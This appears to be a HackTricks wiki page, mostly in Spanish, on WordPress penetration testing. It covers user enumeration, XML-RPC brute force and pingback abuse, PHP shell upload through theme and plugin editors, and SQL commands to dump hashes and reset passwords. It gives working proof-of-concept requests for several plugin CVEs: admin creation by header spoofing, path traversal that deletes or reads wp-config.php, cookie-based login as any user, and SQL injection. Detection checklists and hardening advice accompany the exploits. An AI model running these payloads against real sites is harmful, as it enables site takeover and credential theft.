# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informaci√≥n b√°sica

- Los archivos **Uploaded** van a: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- Los **archivos de themes se pueden encontrar en /wp-content/themes/,** as√≠ que si cambias alg√∫n php del theme para obtener RCE probablemente usar√°s esa ruta. Por ejemplo: Usando **theme twentytwelve** puedes **acceder** al archivo **404.php** en: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Otra url √∫til podr√≠a ser:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- En **wp-config.php** puedes encontrar la contrase√±a root de la base de datos.
- Rutas de login por defecto a comprobar: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Archivos principales de WordPress**

- `index.php`
- `license.txt` contiene informaci√≥n √∫til como la versi√≥n de WordPress instalada.
- `wp-activate.php` se usa para el proceso de activaci√≥n por email al configurar un nuevo sitio WordPress.
- Carpetas de login (pueden ser renombradas para ocultarlas):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` es un archivo que representa una funcionalidad de WordPress que permite transmitir datos usando HTTP como mecanismo de transporte y XML como mecanismo de codificaci√≥n. Este tipo de comunicaci√≥n ha sido reemplazado por la WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- La carpeta `wp-content` es el directorio principal donde se almacenan plugins y themes.
- `wp-content/uploads/` es el directorio donde se almacenan los archivos subidos a la plataforma.
- `wp-includes/` es el directorio donde se guardan los archivos core, como certificados, fuentes, archivos JavaScript y widgets.
- `wp-sitemap.xml` En versiones de WordPress 5.5 y superiores, WordPress genera un archivo sitemap XML con todas las publicaciones p√∫blicas y los tipos de posts y taxonom√≠as p√∫blicamente consultables.

**Post-explotaci√≥n**

- El archivo `wp-config.php` contiene informaci√≥n necesaria para que WordPress se conecte a la base de datos como el nombre de la base de datos, host de la base de datos, usuario y contrase√±a, claves de autenticaci√≥n y salts, y el prefijo de las tablas de la base de datos. Este archivo de configuraci√≥n tambi√©n puede usarse para activar el modo DEBUG, lo cual puede ser √∫til para troubleshooting.

### Permisos de usuarios

- **Administrator**
- **Editor**: Publica y gestiona sus propios posts y los de otros
- **Author**: Publica y gestiona sus propios posts
- **Contributor**: Escribe y gestiona sus posts pero no puede publicarlos
- **Subscriber**: Ver publicaciones y editar su perfil

## **Enumeraci√≥n pasiva**

### **Obtener versi√≥n de WordPress**

Comprueba si puedes encontrar los archivos `/license.txt` o `/readme.html`

Dentro del **c√≥digo fuente** de la p√°gina (ejemplo de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Archivos CSS vinculados

![](<../../images/image (533).png>)

- Archivos JavaScript

![](<../../images/image (524).png>)

### Obtener plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Obtener temas
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraer versiones en general
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Enumeraci√≥n activa

### Plugins y Temas

Probablemente no podr√°s encontrar todos los Plugins y Temas posibles. Para descubrirlos todos, necesitar√°s **Brute Force activamente una lista de Plugins y Temas** (con suerte hay herramientas automatizadas que contienen estas listas).

### Usuarios

- **ID Brute:** Obtienes usuarios v√°lidos de un sitio WordPress haciendo Brute Forcing de los IDs de usuario:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si las respuestas son **200** o **30X**, eso significa que el id es **v√°lido**. Si la respuesta es **400**, entonces el id es **inv√°lido**.

- **wp-json:** Tambi√©n puedes intentar obtener informaci√≥n sobre los usuarios consultando:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Otro endpoint `/wp-json/` que puede revelar alguna informaci√≥n sobre usuarios es:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Ten en cuenta que este endpoint solo expone usuarios que han publicado una entrada. **Solo se proporcionar√° informaci√≥n sobre los usuarios que tengan esta funci√≥n habilitada**.

Tambi√©n ten en cuenta que **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: Al iniciar sesi√≥n en **`/wp-login.php`** el **mensaje** es **diferente** seg√∫n indique si el **nombre de usuario existe o no**.

### XML-RPC

Si `xml-rpc.php` est√° activo puedes realizar un brute-force de credenciales o usarlo para lanzar ataques DoS a otros recursos. (Puedes automatizar este proceso [using this](https://github.com/relarizky/wpxploit), por ejemplo).

Para ver si est√° activo intenta acceder a _**/xmlrpc.php**_ y enviar esta solicitud:

**Comprobar**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** o **`metaWeblog.getUsersBlogs`** son algunos de los m√©todos que se pueden usar para brute-force credentials. Si puedes encontrar cualquiera de ellos puedes enviar algo como:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
El mensaje _"Incorrect username or password"_ dentro de una respuesta 200 deber√≠a aparecer si las credentials no son v√°lidas.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Con las credentials correctas puedes subir un archivo. En la respuesta aparecer√° la ruta ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Tambi√©n hay una **forma m√°s r√°pida** de brute-force credenciales usando **`system.multicall`** ya que puedes probar varias credenciales en la misma petici√≥n:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

Este m√©todo est√° pensado para programas y no para humanos, y es antiguo, por lo que no soporta 2FA. As√≠ que, si tienes creds v√°lidos pero la entrada principal est√° protegida por 2FA, **podr√≠as abusar de xmlrpc.php para hacer login con esos creds eludiendo 2FA**. Ten en cuenta que no podr√°s realizar todas las acciones que puedes hacer desde la consola, pero a√∫n podr√≠as llegar a RCE como Ippsec lo explica en [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

Si encuentras el m√©todo _**pingback.ping**_ dentro de la lista puedes hacer que **Wordpress** env√≠e una solicitud arbitraria a cualquier host/puerto.\
Esto puede usarse para pedir a **miles** de **Wordpress** **sitios** que **accedan** a una **ubicaci√≥n** (causando as√≠ un **DDoS** en ese destino) o puedes usarlo para hacer que **Wordpress** **escanee** alguna **red** interna (puedes indicar cualquier puerto).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si obtienes **faultCode** con un valor **mayor** que **0** (17), significa que el puerto est√° abierto.

F√≠jate en el uso de **`system.multicall`** en la secci√≥n anterior para aprender c√≥mo abusar de este m√©todo y provocar DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

This file usually exists under the root of the Wordpress site: **`/wp-cron.php`**\
Cuando este archivo es **accedido** se realiza una consulta MySQL "**heavy**", por lo que podr√≠a ser usado por **atacantes** para **causar** un **DoS**.\
Adem√°s, por defecto, el `wp-cron.php` se llama en cada carga de p√°gina (cada vez que un cliente solicita cualquier p√°gina de Worpress), lo que en sitios de alto tr√°fico puede causar problemas (DoS).

Se recomienda desactivar Wp-Cron y crear un cronjob real en el host que ejecute las acciones necesarias a intervalos regulares (sin causar problemas).

### /wp-json/oembed/1.0/proxy - SSRF

Intenta acceder a _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ y el Worpress site puede realizar una petici√≥n hacia ti.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Esta herramienta comprueba si existe **methodName: pingback.ping** y el path **/wp-json/oembed/1.0/proxy**, y si existen, intenta explotarlos.

## Herramientas autom√°ticas
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtener acceso sobrescribiendo un bit

M√°s que un ataque real, esto es una curiosidad. En el CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) pod√≠as voltear 1 bit de cualquier archivo de wordpress. As√≠ que pod√≠as voltear la posici√≥n `5389` del archivo `/var/www/html/wp-includes/user.php` para convertir en NOP la operaci√≥n NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modificando un php del theme usado (se necesitan credenciales de administrador)**

Apariencia ‚Üí Editor de temas ‚Üí Plantilla 404 (a la derecha)

Cambia el contenido por un php shell:

![](<../../images/image (384).png>)

Busca en internet c√≥mo puedes acceder a esa p√°gina actualizada. En este caso debes acceder aqu√≠: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Puedes usar:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
Create your php backdoor using for example:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Subida y activaci√≥n de un plugin malicioso

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Once the plugin is successfully installed, it must be activated through the dashboard.
4. **Exploitation**:
- With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable.
- The Metasploit framework provides an exploit for this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established, granting unauthorized access to the site.
- It's noted that this is just one of the many methods to exploit a WordPress site.

El contenido incluye ayudas visuales que muestran los pasos en el dashboard de WordPress para instalar y activar el plugin. Sin embargo, es importante notar que explotar vulnerabilidades de esta manera es ilegal y poco √©tico sin la debida autorizaci√≥n. Esta informaci√≥n debe usarse de forma responsable y solo en un contexto legal, como penetration testing con permiso expl√≠cito.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Crea un usuario en WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Sube tu plugin personalizado (backdoor) a WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edita un Built-In Plugin en WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edita un Built-In Theme en WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personalizados para plugins/temas de terceros de WordPress.

## Post Exploitation

Extraer nombres de usuario y contrase√±as:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Cambiar la contrase√±a del admin:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Superficie de ataque

Saber c√≥mo un plugin de Wordpress puede exponer funcionalidad es clave para encontrar vulnerabilidades en esa funcionalidad. Puedes ver c√≥mo un plugin puede exponer funcionalidad en los siguientes puntos y algunos ejemplos de plugins vulnerables en [**esta entrada del blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Una de las formas en que un plugin puede exponer funciones a los usuarios es mediante manejadores AJAX. √âstas pueden contener bugs de l√≥gica, autorizaci√≥n o autenticaci√≥n. Adem√°s, es bastante frecuente que estas funciones basen tanto la autenticaci√≥n como la autorizaci√≥n en la existencia de un Wordpress nonce que **cualquier usuario autenticado en la instancia de Wordpress podr√≠a tener** (independientemente de su rol).

Estas son las funciones que pueden usarse para exponer una funci√≥n en un plugin:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**El uso de `nopriv` hace que el endpoint sea accesible por cualquier usuario (incluso por usuarios no autenticados).**

> [!CAUTION]
> Adem√°s, si la funci√≥n solo est√° comprobando la autorizaci√≥n del usuario con la funci√≥n `wp_verify_nonce`, esta funci√≥n solo verifica que el usuario ha iniciado sesi√≥n; normalmente no comprueba el rol del usuario. Por lo tanto, usuarios con pocos privilegios podr√≠an tener acceso a acciones de alto privilegio.

- **REST API**

Tambi√©n es posible exponer funciones de wordpress registrando una REST API usando la funci√≥n `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
El `permission_callback` es una callback que comprueba si un usuario dado est√° autorizado para llamar al m√©todo de la API.

**Si se usa la funci√≥n integrada `__return_true`, simplemente omitir√° la comprobaci√≥n de permisos de usuario.**

- **Acceso directo al archivo php**

Por supuesto, Wordpress usa PHP y los archivos dentro de plugins son accesibles directamente desde la web. Por lo tanto, si un plugin expone alguna funcionalidad vulnerable que se activa simplemente accediendo al archivo, ser√° explotable por cualquier usuario.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Algunos plugins implementan atajos de ‚Äútrusted header‚Äù para integraciones internas o reverse proxies y luego usan ese header para establecer el contexto de usuario actual en las peticiones REST. Si el header no est√° vinculado criptogr√°ficamente a la petici√≥n por un componente upstream, un atacante puede falsificarlo y acceder a rutas REST privilegiadas como administrador.

- Impacto: unauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (fuerza el user ID 1, t√≠picamente la primera cuenta de administrador).
- Ruta explotada: `POST /wp-json/wp/v2/users` con un array de roles elevado.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Por qu√© funciona

- El plugin asigna un header controlado por el cliente al estado de autenticaci√≥n y omite las verificaciones de permisos.
- El n√∫cleo de WordPress espera la capability `create_users` para esta ruta; el hack del plugin la evita estableciendo directamente el contexto del usuario actual desde el header.

Indicadores de √©xito esperados

- HTTP 201 con un cuerpo JSON que describe el usuario creado.
- Un nuevo usuario administrador visible en `wp-admin/users.php`.

Lista de verificaci√≥n de detecci√≥n

- Hacer grep de `getallheaders()`, `$_SERVER['HTTP_...']`, o SDKs de proveedores que leen headers personalizados para establecer el contexto de usuario (p. ej., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Revisar los registros de REST en busca de callbacks privilegiados que carezcan de comprobaciones robustas de `permission_callback` y que en su lugar dependan de los headers de la petici√≥n.
- Buscar usos de funciones centrales de gesti√≥n de usuarios (`wp_insert_user`, `wp_create_user`) dentro de handlers REST que est√©n protegidos √∫nicamente por valores de headers.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. Una **comprobaci√≥n de permisos** (p. ej. `current_user_can()` o al menos `is_user_logged_in()`), y
2. Un **nonce CSRF** validado con `check_ajax_referer()` / `wp_verify_nonce()`, y
3. **Saneamiento / validaci√≥n estricta de la entrada**.

El tema multiprop√≥sito Litho (< 3.1) olvid√≥ esos 3 controles en la *Remove Font Family* feature y termin√≥ distribuyendo el siguiente c√≥digo (simplificado):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemas introducidos por este fragmento:

* **Acceso no autenticado** ‚Äì el hook `wp_ajax_nopriv_` est√° registrado.
* **Sin verificaci√≥n de nonce / capacidades** ‚Äì cualquier visitante puede acceder al endpoint.
* **Sin sanitizaci√≥n de la ruta** ‚Äì la cadena controlada por el usuario `fontfamily` se concatena a una ruta del sistema de archivos sin filtrado, permitiendo el cl√°sico `../../` traversal.

#### Explotaci√≥n

Un atacante puede eliminar cualquier archivo o directorio **por debajo del directorio base de uploads** (normalmente `<wp-root>/wp-content/uploads/`) enviando una √∫nica solicitud HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Because `wp-config.php` lives outside *uploads*, four `../` sequences are enough on a default installation.  Deleting `wp-config.php` forces WordPress into the *installation wizard* on the next visit, enabling a full site take-over (the attacker merely supplies a new DB configuration and creates an admin user).

Other impactful targets include plugin/theme `.php` files (to break security plugins) or `.htaccess` rules.

#### Lista de verificaci√≥n de detecci√≥n

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

---

### Escalada de privilegios mediante restauraci√≥n de roles obsoletos y autorizaci√≥n ausente (ASE "View Admin as Role")

Many plugins implement a "view as role" or temporary role-switching feature by saving the original role(s) in user meta so they can be restored later. If the restoration path relies only on request parameters (e.g., `$_REQUEST['reset-for']`) and a plugin-maintained list without checking capabilities and a valid nonce, this becomes a vertical privilege escalation.

A real-world example was found in the Admin and Site Enhancements (ASE) plugin (‚â§ 7.6.2.1). The reset branch restored roles based on `reset-for=<username>` if the username appeared in an internal array `$options['viewing_admin_as_role_are']`, but performed neither a `current_user_can()` check nor a nonce verification before removing current roles and re-adding the saved roles from user meta `_asenha_view_admin_as_original_roles`:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Por qu√© es explotable

- Conf√≠a en `$_REQUEST['reset-for']` y en una opci√≥n del plugin sin autorizaci√≥n del lado del servidor.
- Si un usuario ten√≠a previamente privilegios superiores guardados en `_asenha_view_admin_as_original_roles` y fue degradado, puede restaurarlos accediendo a la ruta de reset.
- En algunas implementaciones, cualquier usuario autenticado podr√≠a desencadenar un reset para otro nombre de usuario a√∫n presente en `viewing_admin_as_role_are` (autorizaci√≥n rota).

Explotaci√≥n (ejemplo)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
En builds vulnerables esto elimina los roles actuales y vuelve a a√±adir los roles originales guardados (p. ej., `administrator`), lo que efectivamente permite escalar privilegios.

Detection checklist

- Busca caracter√≠sticas de cambio de rol que persistan los ‚Äúroles originales‚Äù en user meta (p. ej., `_asenha_view_admin_as_original_roles`).
- Identifica rutas de reset/restore que:
- Leen nombres de usuario desde `$_REQUEST` / `$_GET` / `$_POST`.
- Modifican roles mediante `add_role()` / `remove_role()` sin usar `current_user_can()` y `wp_verify_nonce()` / `check_admin_referer()`.
- Autorizan bas√°ndose en una opci√≥n de plugin en forma de array (p. ej., `viewing_admin_as_role_are`) en lugar de en las capacidades del actor.

---

### Escalada de privilegios no autenticada v√≠a cambio de usuario confiando en cookie en init p√∫blico (Service Finder ‚Äúsf-booking‚Äù)

Algunos plugins enlazan helpers de cambio de usuario al hook p√∫blico `init` y derivan la identidad de una cookie controlada por el cliente. Si el c√≥digo llama a `wp_set_auth_cookie()` sin verificar la autenticaci√≥n, las capacidades y un nonce v√°lido, cualquier visitante no autenticado puede forzar el login como un ID de usuario arbitrario.

Typical vulnerable pattern (simplified from Service Finder Bookings ‚â§ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Por qu√© es explotable

- El hook p√∫blico `init` hace que el handler sea accesible para usuarios no autenticados (no `is_user_logged_in()` guard).
- La identidad se deriva de una cookie modificable por el cliente (`original_user_id`).
- La llamada directa a `wp_set_auth_cookie($uid)` autentica al solicitante como ese usuario sin comprobaciones de capability/nonce.

Explotaci√≥n (no autenticado)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Los WAFs gen√©ricos de borde/servidor est√°n ajustados para patrones amplios (SQLi, XSS, LFI). Muchas vulnerabilidades de alto impacto en WordPress/plugins son fallos de l√≥gica/auth espec√≠ficos de la aplicaci√≥n que parecen tr√°fico benigno a menos que el motor entienda las rutas de WordPress y la sem√°ntica de los plugins.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Don‚Äôt rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Aseg√∫rate de que WordPress, plugins y themes est√©n actualizados. Tambi√©n confirma que la actualizaci√≥n autom√°tica est√© habilitada en wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Adem√°s, **instala √∫nicamente plugins y temas de WordPress confiables**.

### Plugins de seguridad

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Otras recomendaciones**

- Elimina el usuario predeterminado **admin**
- Usa **contrase√±as fuertes** y **2FA**
- Revisa peri√≥dicamente los **permisos** de los usuarios
- **Limita los intentos de inicio de sesi√≥n** para prevenir ataques Brute Force
- Renombra el archivo **`wp-admin.php`** y permite el acceso solo internamente o desde ciertas direcciones IP.


### Inyecci√≥n SQL no autenticada por validaci√≥n insuficiente (WP Job Portal <= 2.3.2)

El plugin de reclutamiento WP Job Portal expon√≠a una tarea **savecategory** que finalmente ejecuta el siguiente c√≥digo vulnerable dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemas introducidos por este snippet:

1. **Unsanitised user input** ‚Äì `parentid` comes straight from the HTTP request.
2. **String concatenation inside the WHERE clause** ‚Äì no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì although the action is executed through `admin-post.php`, the only check in place is a **CSRF nonce** (`wp_verify_nonce()`), which any visitor can retrieve from a public page embedding the shortcode `[wpjobportal_my_resumes]`.

#### Explotaci√≥n

1. Obt√©n un nonce fresco:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inyecta SQL arbitrario abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La respuesta revela el resultado de la consulta inyectada o altera la base de datos, demostrando SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Otra tarea, **downloadcustomfile**, permit√≠a a los visitantes descargar **any file on disk** mediante path traversal. El sink vulnerable est√° ubicado en `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est√° controlado por el atacante y se concatena **sin sanitizaci√≥n**.  Nuevamente, la √∫nica barrera es un **CSRF nonce** que puede obtenerse desde la resume page.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
El servidor responde con el contenido de `wp-config.php`, leaking DB credentials and auth keys.

## Toma de control de cuenta no autenticada v√≠a Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

